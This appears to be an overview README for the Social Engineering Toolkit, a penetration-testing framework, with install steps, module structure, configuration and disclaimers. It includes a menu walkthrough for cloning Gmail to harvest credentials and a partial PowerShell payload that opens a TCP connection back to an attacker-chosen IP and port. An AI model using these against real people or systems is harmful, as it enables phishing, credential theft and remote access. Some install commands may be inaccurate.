# Social Engineering Toolkit (SET) - Comprehensive Documentation

## Overview

The Social Engineering Toolkit (SET) is a comprehensive framework for social engineering attacks and penetration testing. This documentation provides complete coverage of all public APIs, functions, components, and usage instructions.

## Documentation Structure

This comprehensive documentation suite includes:

### 1. [API Documentation](API_DOCUMENTATION.md)
Complete reference for all public APIs, functions, and components with detailed examples and usage instructions.

**Key Sections**:
- Core Modules (`src.core.setcore`, `src.core.webserver`, `src.core.module_handler`)
- Attack Modules (Web attacks, Email attacks, Teensy HID, PowerShell, Wireless)
- Utility Modules (Dictionaries, QR codes, Menu text)
- Configuration management
- Error handling
- Security considerations

### 2. [Usage Guide](USAGE_GUIDE.md)
Step-by-step instructions for using SET effectively in various scenarios.

**Key Sections**:
- Installation and setup
- Basic and advanced usage examples
- Attack vector tutorials
- Troubleshooting common issues
- Best practices and security considerations

### 3. [Module Reference](MODULE_REFERENCE.md)
Detailed reference for all modules, their purposes, functions, and dependencies.

**Key Sections**:
- Core modules and their functions
- Attack modules and capabilities
- Utility modules and helpers
- Configuration modules
- Template modules
- Module dependencies and loading

### 4. [Examples and Tutorials](EXAMPLES_AND_TUTORIALS.md)
Comprehensive examples and real-world scenarios for using SET.

**Key Sections**:
- Basic examples (credential harvester, email attacks, Teensy HID)
- Advanced examples (multi-vector attacks, custom templates)
- Real-world scenarios (corporate phishing, conference Wi-Fi, USB drops)
- Troubleshooting examples
- Code examples for custom development

### 5. [Configuration Guide](CONFIGURATION_GUIDE.md)
Complete guide to configuring SET for various environments and use cases.

**Key Sections**:
- Configuration files and environment variables
- Attack-specific configuration
- Advanced configuration options
- Troubleshooting configuration issues
- Configuration examples for different scenarios

### 6. [Security and Compliance](SECURITY_AND_COMPLIANCE.md)
Essential information about legal, ethical, and security considerations.

**Key Sections**:
- Security considerations and best practices
- Legal and compliance requirements
- Ethical guidelines and professional standards
- Risk management and incident response
- Compliance checklists

## Quick Start

### Installation
```bash
# Method 1: pip installation
pip install set

# Method 2: Git clone
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
python setup.py install

# Method 3: Package manager (Debian/Ubuntu)
apt update
apt install set
```

### Basic Usage
```bash
# Launch SET
setoolkit

# Or use the legacy launcher
python src/core/set.py
```

### First Attack - Credential Harvester
```bash
# Navigate to web attacks
1) Social-Engineering Attacks
   2) Website Attack Vectors
       2) Credential Harvester Attack Method
           1) Web Templates
               2) Gmail
               1) Site Cloner
                   https://gmail.com
               192.168.1.100
               80
```

## Key Features

### Attack Vectors
- **Spear Phishing**: Email-based social engineering with file attachments
- **Web Attacks**: Website cloning, credential harvesting, browser exploits
- **Infectious Media**: USB/CD/DVD payload delivery
- **Teensy HID**: Physical device-based attacks
- **PowerShell**: Windows PowerShell exploitation
- **Wireless**: Access point and DNS spoofing attacks

### Core Capabilities
- **Metasploit Integration**: Seamless integration with Metasploit Framework
- **Custom Payloads**: Support for custom payloads and executables
- **Template System**: Extensive template system for emails and web pages
- **Multi-Platform**: Support for Windows, Linux, and macOS targets
- **Extensibility**: Third-party module support

### Technical Features
- **Web Server**: Built-in HTTP/HTTPS server for web attacks
- **Email Client**: SMTP client for email-based attacks
- **Payload Generation**: Automated payload generation and encoding
- **Logging**: Comprehensive logging and reporting
- **Configuration**: Flexible configuration system

## Architecture

### Core Components
- **`src.core.setcore`**: Core functionality and utilities
- **`src.core.webserver`**: HTTP server for web attacks
- **`src.core.module_handler`**: Third-party module management
- **`src.core.payloadgen`**: Payload generation and creation
- **`src.core.msf_attacks`**: Metasploit integration

### Attack Modules
- **`src.webattack`**: Web-based attack vectors
- **`src.phishing`**: Email-based attack vectors
- **`src.teensy`**: Teensy HID attack vectors
- **`src.powershell`**: PowerShell attack vectors
- **`src.wireless`**: Wireless attack vectors

### Utility Modules
- **`src.core.dictionaries`**: Input mapping functions
- **`src.core.menu.text`**: Menu text and descriptions
- **`src.qrcode`**: QR code generation
- **`src.templates`**: Email and web templates

## Configuration

### Main Configuration File
**Location**: `/etc/setoolkit/set.config`

**Key Settings**:
```bash
# Metasploit Configuration
METASPLOIT_PATH=/usr/share/metasploit-framework/
METASPLOIT_MODE=ON

# Web Server Configuration
WEB_PORT=80
WEBATTACK_SSL=OFF

# Email Configuration
EMAIL_PROVIDER=gmail
SENDMAIL=OFF

# Attack Configuration
AUTO_DETECT=ON
HARVESTER_REDIRECT=OFF
POWERSHELL_INJECTION=ON
```

### Environment Variables
```bash
export SET_HOME=/usr/local/share/setoolkit
export SET_CONFIG=/etc/setoolkit/set.config
export SET_LOGS=/root/.set/logs
export SET_REPORTS=/root/.set/reports
```

## Security and Compliance

### Legal Requirements
- **Authorization**: Always obtain written authorization before testing
- **Compliance**: Follow all applicable laws and regulations
- **Documentation**: Maintain comprehensive documentation
- **Ethics**: Follow professional ethical standards

### Security Considerations
- **Isolation**: Use isolated test environments
- **Monitoring**: Implement comprehensive monitoring
- **Data Protection**: Protect all sensitive data
- **Incident Response**: Have incident response procedures

### Best Practices
- **Planning**: Plan attacks thoroughly
- **Testing**: Test in controlled environments
- **Documentation**: Document all activities
- **Cleanup**: Clean up all artifacts

## Troubleshooting

### Common Issues
1. **Metasploit Not Found**: Install Metasploit Framework
2. **Port Already in Use**: Stop conflicting services or use different port
3. **Permission Denied**: Run with appropriate privileges
4. **Python Module Missing**: Install missing dependencies
5. **SSL Certificate Issues**: Generate SSL certificates

### Debug Mode
```python
# Enable debug mode in setcore.py
DEBUG_LEVEL = 6  # Maximum verbosity
```

### Log Files
- **Main Log**: `/root/.set/logs/set_logfile.log`
- **Harvester Log**: `/root/.set/logs/harvester.log`
- **Reports**: `/root/.set/reports/`

## Development

### Creating Custom Modules
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Module Name: Your Module Name
Description: Brief description of module functionality
Author: Your Name
Version: 1.0
"""

MAIN="Your Module Description"

def main():
    """Main module function"""
    try:
        # Module functionality here
        pass
    except Exception as e:
        print(f"Error: {str(e)}")
        return False
    return True

if __name__ == "__main__":
    main()
```

### Custom Payloads
```python
def create_custom_payload(ip, port):
    """Create custom payload"""
    payload = f"""
    # Custom payload code
    $client = New-Object System.Net.Sockets.TCPClient("{ip}", {port})
    # ... rest of payload
    """
    return payload
```

## Support and Resources

### Documentation
- **API Documentation**: Complete API reference
- **Usage Guide**: Step-by-step usage instructions
- **Module Reference**: Detailed module documentation
- **Examples**: Comprehensive examples and tutorials
- **Configuration**: Configuration guide
- **Security**: Security and compliance guide

### Community
- **GitHub Repository**: https://github.com/trustedsec/social-engineer-toolkit
- **Issue Tracker**: https://github.com/trustedsec/social-engineer-toolkit/issues
- **Discussions**: GitHub Discussions tab

### Training
- **SET Training**: Official SET training courses
- **Social Engineering**: Social engineering awareness training
- **Penetration Testing**: General penetration testing courses

## Version Information

- **Current Version**: 7.7.9
- **Python Compatibility**: 2.7+ and 3.x
- **Dependencies**: See requirements.txt
- **Platform Support**: Linux, macOS (experimental)

## License

This project is licensed under the BSD 3-Clause License. See the LICENSE file for details.

## Disclaimer

**Important**: This toolkit is designed for authorized penetration testing and security research only. Users must:

1. Obtain explicit written permission before testing
2. Comply with all applicable laws and regulations
3. Use only on systems they own or have explicit permission to test
4. Follow responsible disclosure practices

The authors and contributors are not responsible for any misuse of this software.

## Contributing

We welcome contributions to the Social Engineering Toolkit. Please see our contributing guidelines for more information.

### How to Contribute
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

### Development Setup
```bash
# Clone the repository
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit

# Install dependencies
pip install -r requirements.txt

# Run tests
python -m pytest tests/

# Run SET
python src/core/set.py
```

---

This comprehensive documentation provides everything you need to understand, use, and contribute to the Social Engineering Toolkit. Always ensure you have proper authorization and legal compliance before conducting any security tests.